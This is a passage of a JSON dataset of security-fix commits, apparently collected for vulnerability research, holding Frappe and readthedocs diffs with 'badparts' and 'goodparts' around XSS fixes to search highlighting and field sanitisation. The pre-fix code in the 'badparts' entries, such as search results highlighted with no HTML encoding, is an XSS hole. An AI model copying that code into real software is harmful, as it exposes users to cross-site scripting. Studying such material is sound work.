frappe.as_json(self.as_dict())\n\n\tdef get_table_field_doctype(self, fieldname):\n\t\treturn self.meta.get_field(fieldname).options\n\n\tdef get_parentfield_of_doctype(self, doctype):\n\t\tfieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]\n\t\treturn fieldname[0] if fieldname else None\n\n\tdef db_insert(self):\n\t\t\"\"\"INSERT the document (with valid columns) in the database.\"\"\"\n\t\tif not self.name:\n\t\t\t# name will be set by document class in most cases\n\t\t\tset_new_name(self)\n\n\t\tif not self.creation:\n\t\t\tself.creation = self.modified = now()\n\t\t\tself.created_by = self.modifield_by = frappe.session.user\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\tcolumns = list(d)\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}`\n\t\t\t\t({columns}) values ({values})\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tcolumns = \", \".join([\"`\"+c+\"`\" for c in columns]),\n\t\t\t\t\tvalues = \", \".join([\"%s\"] * len(columns))\n\t\t\t\t), list(d.values()))\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062:\n\t\t\t\tif \"PRIMARY\" in cstr(e.args[1]):\n\t\t\t\t\tif self.meta.autoname==\"hash\":\n\t\t\t\t\t\t# hash collision? try again\n\t\t\t\t\t\tself.name = None\n\t\t\t\t\t\tself.db_insert()\n\t\t\t\t\t\treturn\n\n\t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e)\n\n\t\t\t\telif \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\t\t# unique constraint\n\t\t\t\t\tself.show_unique_validation_message(e)\n\t\t\t\telse:\n\t\t\t\t\traise\n\t\t\telse:\n\t\t\t\traise\n\t\tself.set(\"__islocal\", False)\n\n\tdef db_update(self):\n\t\tif self.get(\"__islocal\") or not self.name:\n\t\t\tself.db_insert()\n\t\t\treturn\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\t# don't update name, as case might've been changed\n\t\tname = d['name']\n\t\tdel d['name']\n\n\t\tcolumns = list(d)\n\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}`\n\t\t\t\tset {values} where name=%s\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tvalues = \", \".join([\"`\"+c+\"`=%s\" for c in columns])\n\t\t\t\t), list(d.values()) + [name])\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\tself.show_unique_validation_message(e)\n\t\t\telse:\n\t\t\t\traise\n\n\tdef show_unique_validation_message(self, e):\n\t\ttype, value, traceback = sys.exc_info()\n\t\tfieldname, label = str(e).split(\"'\")[-2], None\n\n\t\t# unique_first_fieldname_second_fieldname is the constraint name\n\t\t# created using frappe.db.add_unique\n\t\tif \"unique_\" in fieldname:\n\t\t\tfieldname = fieldname.split(\"_\", 1)[1]\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif df:\n\t\t\tlabel = df.label\n\n\t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname)))\n\n\t\t# this is used to preserve traceback\n\t\traise frappe.UniqueValidationError(self.doctype, self.name, e)\n\n\tdef update_modified(self):\n\t\t'''Update modified timestamp'''\n\t\tself.set(\"modified\", now())\n\t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)\n\n\tdef _fix_numeric_types(self):\n\t\tfor df in self.meta.get(\"fields\"):\n\t\t\tif df.fieldtype == \"Check\":\n\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\telif self.get(df.fieldname) is not None:\n\t\t\t\tif df.fieldtype == \"Int\":\n\t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\t\telif df.fieldtype in (\"Float\", \"Currency\", \"Percent\"):\n\t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname)))\n\n\t\tif self.docstatus is not None:\n\t\t\tself.docstatus = cint(self.docstatus)\n\n\tdef _get_missing_mandatory_fields(self):\n\t\t\"\"\"Get mandatory fields that do not have any values\"\"\"\n\t\tdef get_msg(df):\n\t\t\tif df.fieldtype == \"Table\":\n\t\t\t\treturn \"{}: {}: {}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label))\n\n\t\t\telif self.parentfield:\n\t\t\t\treturn \"{}: {} {} #{}: {}: {}\".format(_(\"Error\"), frappe.bold(_(self.doctype)),\n\t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label))\n\n\t\t\telse:\n\t\t\t\treturn _(\"Error: Value missing for {0}: {1}\").format(_(df.parent), _(df.label))\n\n\t\tmissing = []\n\n\t\tfor df in self.meta.get(\"fields\", {\"reqd\": ('=', 1)}):\n\t\t\tif self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():\n\t\t\t\tmissing.append((df.fieldname, get_msg(df)))\n\n\t\t# check for missing parent and parenttype\n\t\tif self.meta.istable:\n\t\t\tfor fieldname in (\"parent\", \"parenttype\"):\n\t\t\t\tif not self.get(fieldname):\n\t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname))))\n\n\t\treturn missing\n\n\tdef get_invalid_links(self, is_submittable=False):\n\t\t'''Returns list of invalid links and also updates fetch values if not set'''\n\t\tdef get_msg(df, docname):\n\t\t\tif self.parentfield:\n\t\t\t\treturn \"{} #{}: {}: {}\".format(_(\"Row\"), self.idx, _(df.label), docname)\n\t\t\telse:\n\t\t\t\treturn \"{}: {}\".format(_(df.label), docname)\n\n\t\tinvalid_links = []\n\t\tcancelled_links = []\n\n\t\tfor df in (self.meta.get_link_fields()\n\t\t\t\t+ self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Dynamic Link\")})):\n\t\t\tdocname = self.get(df.fieldname)\n\n\t\t\tif docname:\n\t\t\t\tif df.fieldtype==\"Link\":\n\t\t\t\t\tdoctype = df.options\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field {0}\").format(df.fieldname))\n\t\t\t\telse:\n\t\t\t\t\tdoctype = self.get(df.options)\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options)))\n\n\t\t\t\t# MySQL is case insensitive. Preserve case of the original docname in the Link Field.\n\n\t\t\t\t# get a map of values ot fetch along with this link query\n\t\t\t\t# that are mapped as link_fieldname.source_fieldname in Options of\n\t\t\t\t# Readonly or Data or Text type fields\n\n\t\t\t\tfields_to_fetch = [\n\t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname)\n\t\t\t\t\tif\n\t\t\t\t\t\tnot _df.get('fetch_if_empty')\n\t\t\t\t\t\tor (_df.get('fetch_if_empty') and not self.get(_df.fieldname))\n\t\t\t\t]\n\n\t\t\t\tif not fields_to_fetch:\n\t\t\t\t\t# cache a single value type\n\t\t\t\t\tvalues = frappe._dict(name=frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\t'name', cache=True))\n\t\t\t\telse:\n\t\t\t\t\tvalues_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]\n\t\t\t\t\t\tfor _df in fields_to_fetch]\n\n\t\t\t\t\t# don't cache if fetching other values too\n\t\t\t\t\tvalues = frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\tvalues_to_fetch, as_dict=True)\n\n\t\t\t\tif frappe.get_meta(doctype).issingle:\n\t\t\t\t\tvalues.name = doctype\n\n\t\t\t\tif values:\n\t\t\t\t\tsetattr(self, df.fieldname, values.name)\n\n\t\t\t\t\tfor _df in fields_to_fetch:\n\t\t\t\t\t\tif self.is_new() or self.docstatus != 1 or _df.allow_on_submit:\n\t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])\n\n\t\t\t\t\tnotify_link_count(doctype, docname)\n\n\t\t\t\t\tif not values.name:\n\t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\t\t\t\telif (df.fieldname != \"amended_from\"\n\t\t\t\t\t\tand (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable\n\t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2):\n\n\t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\treturn invalid_links, cancelled_links\n\n\tdef _validate_selects(self):\n\t\tif frappe.flags.in_import:\n\t\t\treturn\n\n\t\tfor df in self.meta.get_select_fields():\n\t\t\tif df.fieldname==\"naming_series\" or not (self.get(df.fieldname) and df.options):\n\t\t\t\tcontinue\n\n\t\t\toptions = (df.options or \"\").split(\"\\n\")\n\n\t\t\t# if only empty options\n\t\t\tif not filter(None, options):\n\t\t\t\tcontinue\n\n\t\t\t# strip and set\n\t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip())\n\t\t\tvalue = self.get(df.fieldname)\n\n\t\t\tif value not in options and not (frappe.flags.in_test and value.startswith(\"_T-\")):\n\t\t\t\t# show an elaborate message\n\t\t\t\tprefix = _(\"Row #{0}:\").format(self.idx) if self.get(\"parentfield\") else \"\"\n\t\t\t\tlabel = _(self.meta.get_label(df.fieldname))\n\t\t\t\tcomma_options = '\", \"'.join(_(each) for each in options)\n\n\t\t\t\tfrappe.throw(_('{0} {1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label,\n\t\t\t\t\tvalue, comma_options))\n\n\tdef _validate_constants(self):\n\t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:\n\t\t\treturn\n\n\t\tconstants = [d.fieldname for d in self.meta.get(\"fields\", {\"set_only_once\": ('=',1)})]\n\t\tif constants:\n\t\t\tvalues = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)\n\n\t\tfor fieldname in constants:\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\t# This conversion to string only when fieldtype is Date\n\t\t\tif df.fieldtype == 'Date' or df.fieldtype == 'Datetime':\n\t\t\t\tvalue = str(values.get(fieldname))\n\n\t\t\telse:\n\t\t\t\tvalue  = values.get(fieldname)\n\n\t\t\tif self.get(fieldname) != value:\n\t\t\t\tfrappe.throw(_(\"Value cannot be changed for {0}\").format(self.meta.get_label(fieldname)),\n\t\t\t\t\tfrappe.CannotChangeConstantError)\n\n\tdef _validate_length(self):\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tif self.meta.issingle:\n\t\t\t# single doctype value type is mediumtext\n\t\t\treturn\n\n\t\tcolumn_types_to_check_length = ('varchar', 'int', 'bigint')\n\n\t\tfor fieldname, value in iteritems(self.get_valid_dict()):\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\tif not df or df.fieldtype == 'Check':\n\t\t\t\t# skip standard fields and Check fields\n\t\t\t\tcontinue\n\n\t\t\tcolumn_type = type_map[df.fieldtype][0] or None\n\t\t\tdefault_column_max_length = type_map[df.fieldtype][1] or None\n\n\t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length:\n\t\t\t\tmax_length = cint(df.get(\"length\")) or cint(default_column_max_length)\n\n\t\t\t\tif len(cstr(value)) > max_length:\n\t\t\t\t\tif self.parentfield and self.idx:\n\t\t\t\t\t\treference = _(\"{0}, Row {1}\").format(_(self.doctype), self.idx)\n\n\t\t\t\t\telse:\n\t\t\t\t\t\treference = \"{0} {1}\".format(_(self.doctype), self.name)\n\n\t\t\t\t\tfrappe.throw(_(\"{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}\")\\\n\t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))\n\n\tdef _validate_update_after_submit(self):\n\t\t# get the full doc with children\n\t\tdb_values = frappe.get_doc(self.doctype, self.name).as_dict()\n\n\t\tfor key in self.as_dict():\n\t\t\tdf = self.meta.get_field(key)\n\t\t\tdb_value = db_values.get(key)\n\n\t\t\tif df and not df.allow_on_submit and (self.get(key) or db_value):\n\t\t\t\tif df.fieldtype==\"Table\":\n\t\t\t\t\t# just check if the table size has changed\n\t\t\t\t\t# individual fields will be checked in the loop for children\n\t\t\t\t\tself_value = len(self.get(key))\n\t\t\t\t\tdb_value = len(db_value)\n\n\t\t\t\telse:\n\t\t\t\t\tself_value = self.get_value(key)\n\n\t\t\t\tif self_value != db_value:\n\t\t\t\t\tfrappe.throw(_(\"Not allowed to change {0} after submission\").format(df.label),\n\t\t\t\t\t\tfrappe.UpdateAfterSubmitError)\n\n\tdef _sanitize_content(self):\n\t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS.\n\n\t\t\t- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'\n\t\t\"\"\"\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tfor fieldname, value in self.get_valid_dict().items():\n\t\t\tif not value or not isinstance(value, string_types):\n\t\t\t\tcontinue\n\n\t\t\tvalue = frappe.as_unicode(value)\n\n\t\t\tif (u\"<\" not in value and u\">\" not in value):\n\t\t\t\t# doesn't look like html so no need\n\t\t\t\tcontinue\n\n\t\t\telif \"<!-- markdown -->\" in value and not (\"<script\" in value or \"javascript:\" in value):\n\t\t\t\t# should be handled separately via the markdown converter function\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tsanitized_value = value\n\n\t\t\tif df and df.get(\"fieldtype\") in (\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\":\n\t\t\t\tsanitized_value = sanitize_email(value)\n\n\t\t\telif df and (df.get(\"ignore_xss_filter\")\n\t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n\n\t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n\t\t\t\t\t\tor self.docstatus==2\n\t\t\t\t\t\tor (self.docstatus==1 and not df.get(\"allow_on_submit\"))):\n\t\t\t\tcontinue\n\n\t\t\telse:\n\t\t\t\tsanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')\n\n\t\t\tself.set(fieldname, sanitized_value)\n\n\tdef _save_passwords(self):\n\t\t'''Save password field values in __Auth table'''\n\t\tif self.flags.ignore_save_passwords is True:\n\t\t\treturn\n\n\t\tfor df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):\n\t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue\n\t\t\tnew_password = self.get(df.fieldname)\n\t\t\tif new_password and not self.is_dummy_password(new_password):\n\t\t\t\t# is not a dummy password like '*****'\n\t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname)\n\n\t\t\t\t# set dummy password like '*****'\n\t\t\t\tself.set(df.fieldname, '*'*len(new_password))\n\n\tdef get_password(self, fieldname='password', raise_exception=True):\n\t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):\n\t\t\treturn self.get(fieldname)\n\n\t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)\n\n\tdef is_dummy_password(self, pwd):\n\t\treturn ''.join(set(pwd))=='*'\n\n\tdef precision(self, fieldname, parentfield=None):\n\t\t\"\"\"Returns float precision for a particular field (or get global default).\n\n\t\t:param fieldname: Fieldname for which precision is required.\n\t\t:param parentfield: If fieldname is in child table.\"\"\"\n\t\tfrom frappe.model.meta import get_field_precision\n\n\t\tif parentfield and not isinstance(parentfield, string_types):\n\t\t\tparentfield = parentfield.parentfield\n\n\t\tcache_key = parentfield or \"main\"\n\n\t\tif not hasattr(self, \"_precision\"):\n\t\t\tself._precision = frappe._dict()\n\n\t\tif cache_key not in self._precision:\n\t\t\tself._precision[cache_key] = frappe._dict()\n\n\t\tif fieldname not in self._precision[cache_key]:\n\t\t\tself._precision[cache_key][fieldname] = None\n\n\t\t\tdoctype = self.meta.get_field(parentfield).options if parentfield else self.doctype\n\t\t\tdf = frappe.get_meta(doctype).get_field(fieldname)\n\n\t\t\tif df.fieldtype in (\"Currency\", \"Float\", \"Percent\"):\n\t\t\t\tself._precision[cache_key][fieldname] = get_field_precision(df, self)\n\n\t\treturn self._precision[cache_key][fieldname]\n\n\n\tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):\n\t\tfrom frappe.utils.formatters import format_value\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif not df and fieldname in default_fields:\n\t\t\tfrom frappe.model.meta import get_default_df\n\t\t\tdf = get_default_df(fieldname)\n\n\t\tval = self.get(fieldname)\n\n\t\tif translated:\n\t\t\tval = _(val)\n\n\t\tif absolute_value and isinstance(val, (int, float)):\n\t\t\tval = abs(self.get(fieldname))\n\n\t\tif not doc:\n\t\t\tdoc = getattr(self, \"parent_doc\", None) or self\n\n\t\treturn format_value(val, df=df, doc=doc, currency=currency)\n\n\tdef is_print_hide(self, fieldname, df=None, for_print=True):\n\t\t\"\"\"Returns true if fieldname is to be hidden for print.\n\n\t\tPrint Hide can be set via the Print Format Builder or in the controller as a list\n\t\tof hidden fields. Example\n\n\t\t\tclass MyDoc(Document):\n\t\t\t\tdef __setup__(self):\n\t\t\t\t\tself.print_hide = [\"field1\", \"field2\"]\n\n\t\t:param fieldname: Fieldname to be checked if hidden.\n\t\t\"\"\"\n\t\tmeta_df = self.meta.get_field(fieldname)\n\t\tif meta_df and meta_df.get(\"__print_hide\"):\n\t\t\treturn True\n\n\t\tprint_hide = 0\n\n\t\tif self.get(fieldname)==0 and not self.meta.istable:\n\t\t\tprint_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )\n\n\t\tif not print_hide:\n\t\t\tif df and df.print_hide is not None:\n\t\t\t\tprint_hide = df.print_hide\n\t\t\telif meta_df:\n\t\t\t\tprint_hide = meta_df.print_hide\n\n\t\treturn print_hide\n\n\tdef in_format_data(self, fieldname):\n\t\t\"\"\"Returns True if shown via Print Format::`format_data` property.\n\t\t\tCalled from within standard print format.\"\"\"\n\t\tdoc = getattr(self, \"parent_doc\", self)\n\n\t\tif hasattr(doc, \"format_data_map\"):\n\t\t\treturn fieldname in doc.format_data_map\n\t\telse:\n\t\t\treturn True\n\n\tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):\n\t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\"\n\t\tto_reset = []\n\n\t\tfor df in high_permlevel_fields:\n\t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:\n\t\t\t\tto_reset.append(df)\n\n\t\tif to_reset:\n\t\t\tif self.is_new():\n\t\t\t\t# if new, set default value\n\t\t\t\tref_doc = frappe.new_doc(self.doctype)\n\t\t\telse:\n\t\t\t\t# get values from old doc\n\t\t\t\tif self.get('parent_doc'):\n\t\t\t\t\tself.parent_doc.get_latest()\n\t\t\t\t\tref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]\n\t\t\t\telse:\n\t\t\t\t\tref_doc = self.get_latest()\n\n\t\t\tfor df in to_reset:\n\t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname))\n\n\tdef get_value(self, fieldname):\n\t\tdf = self.meta.get_field(fieldname)\n\t\tval = self.get(fieldname)\n\n\t\treturn self.cast(val, df)\n\n\tdef cast(self, value, df):\n\t\treturn cast_fieldtype(df.fieldtype, value)\n\n\tdef _extract_images_from_text_editor(self):\n\t\tfrom frappe.utils.file_manager import extract_images_from_doc\n\t\tif self.doctype != \"DocType\":\n\t\t\tfor df in self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Text Editor\")}):\n\t\t\t\textract_images_from_doc(self, df.fieldname)\n\ndef _filter(data, filters, limit=None):\n\t\"\"\"pass filters as:\n\t\t{\"key\": \"val\", \"key\": [\"!=\", \"val\"],\n\t\t\"key\": [\"in\", \"val\"], \"key\": [\"not in\", \"val\"], \"key\": \"^val\",\n\t\t\"key\" : True (exists), \"key\": False (does not exist) }\"\"\"\n\n\tout, _filters = [], {}\n\n\tif not data:\n\t\treturn out\n\n\t# setup filters as tuples\n\tif filters:\n\t\tfor f in filters:\n\t\t\tfval = filters[f]\n\n\t\t\tif not isinstance(fval, (tuple, list)):\n\t\t\t\tif fval is True:\n\t\t\t\t\tfval = (\"not None\", fval)\n\t\t\t\telif fval is False:\n\t\t\t\t\tfval = (\"None\", fval)\n\t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"):\n\t\t\t\t\tfval = (\"^\", fval[1:])\n\t\t\t\telse:\n\t\t\t\t\tfval = (\"=\", fval)\n\n\t\t\t_filters[f] = fval\n\n\tfor d in data:\n\t\tadd = True\n\t\tfor f, fval in iteritems(_filters):\n\t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]):\n\t\t\t\tadd = False\n\t\t\t\tbreak\n\n\t\tif add:\n\t\t\tout.append(d)\n\t\t\tif limit and (len(out)-1)==limit:\n\t\t\t\tbreak\n\n\treturn out\n"}}, "msg": "fix(Barcode): excluding Barcode feild from XSS FIlter (#7605)\n\n(cherry picked from commit e579b8960e1c34e7ad0bf794a10596b40530bc09)"}}, "https://github.com/readthedocs/readthedocs.org": {"1ebe494ffde18109307f205d2bd94102452f697a": {"url": "https://api.github.com/repos/readthedocs/readthedocs.org/commits/1ebe494ffde18109307f205d2bd94102452f697a", "html_url": "https://github.com/readthedocs/readthedocs.org/commit/1ebe494ffde18109307f205d2bd94102452f697a", "sha": "1ebe494ffde18109307f205d2bd94102452f697a", "keyword": "XSS issue", "diff": "diff --git a/readthedocs/search/documents.py b/readthedocs/search/documents.py\nindex 651fb483a5..5fa66b2528 100644\n--- a/readthedocs/search/documents.py\n+++ b/readthedocs/search/documents.py\n@@ -91,11 +91,22 @@ def faceted_search(cls, query, projects_list=None, versions_list=None, using=Non\n \n     @classmethod\n     def simple_search(cls, query, using=None, index=None):\n+        \"\"\"\n+        Do a search without facets.\n+\n+        This is used in:\n+\n+        * The Docsearch API\n+        * The Project Admin Search page\n+        \"\"\"\n+\n         es_search = cls.search(using=using, index=index)\n+        es_search = es_search.highlight_options(encoder='html')\n+\n         es_query = cls.get_es_query(query=query)\n         highlighted_fields = [f.split('^', 1)[0] for f in cls.search_fields]\n-\n         es_search = es_search.query(es_query).highlight(*highlighted_fields)\n+\n         return es_search\n \n     @classmethod\ndiff --git a/readthedocs/search/faceted_search.py b/readthedocs/search/faceted_search.py\nindex 4a14cb8c54..1739d9aeaf 100644\n--- a/readthedocs/search/faceted_search.py\n+++ b/readthedocs/search/faceted_search.py\n@@ -1,5 +1,4 @@\n from elasticsearch_dsl import FacetedSearch, TermsFacet\n-from elasticsearch_dsl.query import SimpleQueryString, Bool\n \n \n class RTDFacetedSearch(FacetedSearch):\n@@ -38,6 +37,7 @@ def query(self, search, query):\n \n         Overriding because we pass ES Query object instead of string\n         \"\"\"\n+        search = search.highlight_options(encoder='html')\n         if query:\n             search = search.query(query)\n \n", "message": "", "files": {"/readthedocs/search/faceted_search.py": {"changes": [{"diff": "\n from elasticsearch_dsl import FacetedSearch, TermsFacet\n-from elasticsearch_dsl.query import SimpleQueryString, Bool\n \n \n class RTDFacetedSearch(FacetedSearch):\n", "add": 0, "remove": 1, "filename": "/readthedocs/search/faceted_search.py", "badparts": ["from elasticsearch_dsl.query import SimpleQueryString, Bool"], "goodparts": []}], "source": "\nfrom elasticsearch_dsl import FacetedSearch, TermsFacet from elasticsearch_dsl.query import SimpleQueryString, Bool class RTDFacetedSearch(FacetedSearch): \"\"\"Overwrite the initialization in order too meet our needs\"\"\" def __init__(self, using, index, doc_types, model, fields=None, **kwargs): self.using=using self.index=index self.doc_types=doc_types self._model=model if fields: self.fields=fields super(RTDFacetedSearch, self).__init__(**kwargs) class ProjectSearch(RTDFacetedSearch): fields=['name^5', 'description'] facets={ 'language': TermsFacet(field='language') } class FileSearch(RTDFacetedSearch): facets={ 'project': TermsFacet(field='project'), 'version': TermsFacet(field='version') } def query(self, search, query): \"\"\" Add query part to ``search`` Overriding because we pass ES Query object instead of string \"\"\" if query: search=search.query(query) return search ", "sourceWithComments": "from elasticsearch_dsl import FacetedSearch, TermsFacet\nfrom elasticsearch_dsl.query import SimpleQueryString, Bool\n\n\nclass RTDFacetedSearch(FacetedSearch):\n\n    \"\"\"Overwrite the initialization in order too meet our needs\"\"\"\n\n    # TODO: Remove the overwrite when the elastic/elasticsearch-dsl-py#916\n    # See more: https://github.com/elastic/elasticsearch-dsl-py/issues/916\n\n    def __init__(self, using, index, doc_types, model, fields=None, **kwargs):\n        self.using = using\n        self.index = index\n        self.doc_types = doc_types\n        self._model = model\n        if fields:\n            self.fields = fields\n        super(RTDFacetedSearch, self).__init__(**kwargs)\n\n\nclass ProjectSearch(RTDFacetedSearch):\n    fields = ['name^5', 'description']\n    facets = {\n        'language': TermsFacet(field='language')\n    }\n\n\nclass FileSearch(RTDFacetedSearch):\n    facets = {\n        'project': TermsFacet(field='project'),\n        'version': TermsFacet(field='version')\n    }\n\n    def query(self, search, query):\n        \"\"\"\n        Add query part to ``search``\n\n        Overriding because we pass ES Query object instead of string\n        \"\"\"\n        if query:\n            search = search.query(query)\n\n        return search\n"}}, "msg": "Properly use the HTML encoder on searches.\n\nThis fixes an XSS issue that we were hitting,\nwhere search results were showing HTML to users."}, "13ca0161273c368fdb6a51900a9c08917115307b": {"url": "https://api.github.com/repos/readthedocs/readthedocs.org/commits/13ca0161273c368fdb6a51900a9c08917115307b", "html_url": "https://github.com/readthedocs/readthedocs.org/commit/13ca0161273c368fdb6a51900a9c08917115307b", "sha": "13ca0161273c368fdb6a51900a9c08917115307b", "keyword": "XSS fix", "diff": "diff --git a/readthedocs/search/tests/test_xss.py b/readthedocs/search/tests/test_xss.py\nindex 7603c28d34..59b365535c 100644\n--- a/readthedocs/search/tests/test_xss.py\n+++ b/readthedocs/search/tests/test_xss.py\n@@ -14,4 +14,19 @@ def test_facted_page_xss(self, client, project):\n         expected = \"\"\"\n         &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n         \"\"\".strip()\n-        assert results[0].meta.highlight.content[0][:len(expected)] == expected\n+\n+        hits = results.hits.hits\n+        assert len(hits) == 1  # there should be only one result\n+\n+        inner_hits = hits[0]['inner_hits']\n+\n+        domain_hits = inner_hits['domains']['hits']['hits']\n+        assert len(domain_hits) == 0  # there shouldn't be any results from domains\n+\n+        section_hits = inner_hits['sections']['hits']['hits']\n+        assert len(section_hits) == 1\n+\n+        section_content_highlight = section_hits[0]['highlight']['sections.content']\n+        assert len(section_content_highlight) == 1\n+\n+        assert expected in section_content_highlight[0]\n", "message": "", "files": {"/readthedocs/search/tests/test_xss.py": {"changes": [{"diff": "\n         expected = \"\"\"\n         &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n         \"\"\".strip()\n-        assert results[0].meta.highlight.content[0][:len(expected)] == expected\n+\n+        hits = results.hits.hits\n+        assert len(hits) == 1  # there should be only one result\n+\n+        inner_hits = hits[0]['inner_hits']\n+\n+        domain_hits = inner_hits['domains']['hits']['hits']\n+        assert len(domain_hits) == 0  # there shouldn't be any results from domains\n+\n+        section_hits = inner_hits['sections']['hits']['hits']\n+        assert len(section_hits) == 1\n+\n+        section_content_highlight = section_hits[0]['highlight']['sections.content']\n+        assert len(section_content_highlight) == 1\n+\n+        assert expected in section_content_highlight[0]\n", "add": 16, "remove": 1, "filename": "/readthedocs/search/tests/test_xss.py", "badparts": ["        assert results[0].meta.highlight.content[0][:len(expected)] == expected"], "goodparts": ["        hits = results.hits.hits", "        assert len(hits) == 1  # there should be only one result", "        inner_hits = hits[0]['inner_hits']", "        domain_hits = inner_hits['domains']['hits']['hits']", "        assert len(domain_hits) == 0  # there shouldn't be any results from domains", "        section_hits = inner_hits['sections']['hits']['hits']", "        assert len(section_hits) == 1", "        section_content_highlight = section_hits[0]['highlight']['sections.content']", "        assert len(section_content_highlight) == 1", "        assert expected in section_content_highlight[0]"]}], "source": "\nimport pytest from readthedocs.search.documents import PageDocument @pytest.mark.django_db @pytest.mark.search class TestXSS: def test_facted_page_xss(self, client, project): query='XSS' page_search=PageDocument.faceted_search(query=query, user='') results=page_search.execute() expected=\"\"\" &lt;h3&gt;<em>XSS</em> exploit&lt;& \"\"\".strip() assert results[0].meta.highlight.content[0][:len(expected)]==expected ", "sourceWithComments": "import pytest\n\nfrom readthedocs.search.documents import PageDocument\n\n\n@pytest.mark.django_db\n@pytest.mark.search\nclass TestXSS:\n\n    def test_facted_page_xss(self, client, project):\n        query = 'XSS'\n        page_search = PageDocument.faceted_search(query=query, user='')\n        results = page_search.execute()\n        expected = \"\"\"\n        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n        \"\"\".strip()\n        assert results[0].meta.highlight.content[0][:len(expected)] == expected\n"}}, "msg": "fix test_xss.py"}, "ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e": {"url": "https://api.github.com/repos/readthedocs/readthedocs.org/commits/ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e", "html_url": "https://github.com/readthedocs/readthedocs.org/commit/ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e", "sha": "ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e", "keyword": "XSS fix", "diff": "diff --git a/readthedocs/search/tests/test_xss.py b/readthedocs/search/tests/test_xss.py\nindex 59b365535c..ed5d674f66 100644\n--- a/readthedocs/search/tests/test_xss.py\n+++ b/readthedocs/search/tests/test_xss.py\n@@ -12,7 +12,7 @@ def 